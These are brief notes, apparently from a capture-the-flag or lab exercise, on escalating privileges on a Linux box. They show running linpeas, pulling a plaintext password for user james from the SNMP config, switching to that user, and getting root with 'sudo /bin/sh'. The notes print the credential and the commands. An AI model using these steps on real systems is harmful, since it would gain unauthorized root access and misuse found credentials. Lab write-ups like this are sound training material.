SSHd as user `svc` into the system

Ran `linpeas.sh` and found a password in `/etc/snmp/snmpd.conf`
![[Pasted image 20240905175937.png]]

```bash
su james
```
`james:SuperSecurePassword123__`

```bash
sudo -l
```
![[Pasted image 20240905180359.png]]

Privesc is simple
```bash
sudo /bin/sh
```
